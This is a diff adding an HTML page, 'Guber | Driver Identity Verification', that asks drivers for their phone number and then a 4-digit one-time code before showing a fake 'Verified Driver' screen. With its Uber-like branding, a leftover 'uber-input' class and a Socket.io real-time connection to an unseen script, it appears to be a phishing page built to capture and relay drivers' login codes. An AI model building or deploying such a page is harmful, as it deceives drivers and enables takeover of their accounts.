@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Guber | Driver Identity Verification</title>
+    <meta name="description" content="Guber Active Driver Identity Verification Portal">
+    <!-- Google Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+
+    <!-- Header Navigation Bar -->
+    <header class="navbar">
+        <div class="nav-container">
+            <div class="nav-left">
+                <a href="index.html" class="brand-logo">Guber</a>
+            </div>
+            <div class="nav-right">
+                <div class="lang-dropdown">
+                    <button class="lang-btn" id="lang-btn" onclick="toggleLangDropdown()">
+                        <i class="fa-solid fa-globe"></i> <span id="current-lang-text">EN</span> <i class="fa-solid fa-chevron-down nav-arrow"></i>
+                    </button>
+                    <div class="lang-menu hidden" id="lang-menu">
+                        <div class="lang-option active" onclick="switchLanguage('en')">🇺🇸 English</div>
+                        <div class="lang-option" onclick="switchLanguage('es')">🇪🇸 Español</div>
+                    </div>
+                </div>
+                <a href="#" class="nav-link-btn" id="nav-help">Help</a>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content Container -->
+    <main class="main-wrapper">
+        <div class="content-container">
+            
+            <!-- Left Column: Verification Card Box -->
+            <div class="verification-card-box">
+
+                <h1 class="hero-title" id="txt-title">Driver Identity Verification</h1>
+                <p class="hero-subtitle" id="txt-subtitle">Please enter your registered phone number to confirm your active driver identity.</p>
+
+                <!-- STEP 1: Phone Input Form -->
+                <div id="step-phone" class="step-view active-step">
+                    <form id="phone-form" onsubmit="handlePhoneSubmit(event)">
+                        <div class="input-group">
+                            <label for="phone-input" class="input-label" id="txt-label-phone">Mobile Phone Number</label>
+                            <div class="phone-input-wrapper">
+                                <div class="country-code-selector">
+                                    <span class="flag">🇺🇸</span>
+                                    <span class="code">+1</span>
+                                </div>
+                                <input type="tel" id="phone-input" class="uber-input" placeholder="(555) 019-2834" required autocomplete="tel">
+                            </div>
+                        </div>
+
+                        <button type="submit" id="btn-send-phone" class="btn-black-primary">
+                            <span class="btn-text" id="txt-btn-send">Send Verification Code</span>
+                            <span class="btn-spinner hidden"><i class="fa-solid fa-circle-notch fa-spin"></i></span>
+                        </button>
+                        
+                        <div class="security-note" id="txt-security-note">
+                            <i class="fa-solid fa-shield-halved"></i>
+                            Your information is encrypted and secured by Guber Driver Protocols.
+                        </div>
+                    </form>
+                </div>
+
+                <!-- STEP 2: 4-Digit OTP Screen -->
+                <div id="step-otp" class="step-view hidden-step">
+                    <div class="back-link" onclick="goToStepPhone()">
+                        <i class="fa-solid fa-arrow-left"></i> <span id="txt-change-phone">Change phone number</span> (<span id="user-phone-display"></span>)
+                    </div>
+
+                    <h2 class="step-heading" id="txt-heading-otp">Enter Verification Code (OTP)</h2>
+                    <p class="otp-instruction" id="txt-instruction-otp">A 4-digit verification code has been sent to your phone.</p>
+
+                    <form id="otp-form" onsubmit="handleOtpSubmit(event)">
+                        <div class="otp-container" id="otp-inputs-container">
+                            <input type="text" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="otp-box" id="otp-1" required>
+                            <input type="text" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="otp-box" id="otp-2" required>
+                            <input type="text" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="otp-box" id="otp-3" required>
+                            <input type="text" maxlength="1" pattern="[0-9]*" inputmode="numeric" class="otp-box" id="otp-4" required>
+                        </div>
+
+                        <div class="resend-wrapper">
+                            <span id="txt-resend-prompt">Didn't receive the code? </span>
+                            <button type="button" id="btn-resend" class="btn-resend-link" disabled onclick="resendCode()">
+                                <span id="txt-resend-btn">Resend code</span> (<span id="timer-count">30</span>s)
+                            </button>
+                        </div>
+
+                        <button type="submit" id="btn-verify-otp" class="btn-black-primary">
+                            <span class="btn-text" id="txt-btn-verify">Verify Code</span>
+                            <span class="btn-spinner hidden"><i class="fa-solid fa-circle-notch fa-spin"></i></span>
+                        </button>
+                    </form>
+                </div>
+
+                <!-- STEP 3: Driver Verified Success Screen -->
+                <div id="step-verified" class="step-view hidden-step">
+                    <div class="success-animation-container">
+                        <div class="checkmark-wrapper">
+                            <svg class="checkmark-svg" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
+                                <circle class="checkmark-circle" cx="26" cy="26" r="25" fill="none"/>
+                                <path class="checkmark-check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
+                            </svg>
+                        </div>
+                    </div>
+
+                    <div class="verified-badge">
+                        <i class="fa-solid fa-circle-check"></i> VERIFIED DRIVER
+                    </div>
+
+                    <h2 class="success-title" id="txt-success-title">Driver Identity Successfully Verified!</h2>
+                    <p class="success-description" id="txt-success-desc">Your active driver identity has been confirmed and verified for your current vehicle shift.</p>
+
+                    <div class="verification-summary-card">
+                        <div class="summary-row">
+                            <span class="summary-label" id="txt-label-status">Account Status:</span>
+                            <span class="summary-value green-text"><i class="fa-solid fa-check"></i> <span id="txt-val-status">Confirmed Active Driver</span></span>
+                        </div>
+                        <div class="summary-row">
+                            <span class="summary-label" id="txt-label-driver-phone">Driver Phone:</span>
+                            <span class="summary-value" id="final-phone-display">+1 (555) 000-0000</span>
+                        </div>
+                        <div class="summary-row">
+                            <span class="summary-label" id="txt-label-time">Verification Time:</span>
+                            <span class="summary-value" id="final-date-display">Just now</span>
+                        </div>
+                    </div>
+
+                    <button type="button" class="btn-black-primary" onclick="resetFlow()">
+                        <span id="txt-btn-home">Return to Driver Home</span>
+                    </button>
+                </div>
+
+            </div>
+
+            <!-- Right Column: City Car Hero Illustration Box -->
+            <div class="hero-illustration-box">
+                <div class="promo-card">
+                    <div class="promo-image-container">
+                        <img src="https://images.unsplash.com/photo-1503376780353-7e6692767b70?auto=format&fit=crop&w=800&q=80" alt="Guber City Driver" class="promo-img">
+                        <div class="promo-overlay">
+                            <h3 id="txt-promo-title">Active Driver Portal</h3>
+                            <p id="txt-promo-desc">Ensure identity compliance before starting your drive shift.</p>
+                        </div>
+                    </div>
+                    
+                    <div class="services-grid">
+                        <div class="service-item">
+                            <div class="service-icon"><i class="fa-solid fa-id-card"></i></div>
+                            <div class="service-info">
+                                <h4 id="txt-srv1-title">Identity Compliance</h4>
+                                <p id="txt-srv1-desc">Verify active driver identity securely</p>
+                            </div>
+                        </div>
+                        <div class="service-item">
+                            <div class="service-icon"><i class="fa-solid fa-shield-cat"></i></div>
+                            <div class="service-info">
+                                <h4 id="txt-srv2-title">Safety Standard</h4>
+                                <p id="txt-srv2-desc">Protecting riders & platform integrity</p>
+                            </div>
+                        </div>
+                        <div class="service-item">
+                            <div class="service-icon"><i class="fa-solid fa-car-side"></i></div>
+                            <div class="service-info">
+                                <h4 id="txt-srv3-title">Shift Activation</h4>
+                                <p id="txt-srv3-desc">Ready to accept ride requests</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </main>
+
+    <!-- Socket.io & App JS -->
+    <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+    <script src="js/app.js"></script>
+</body>
+</html>
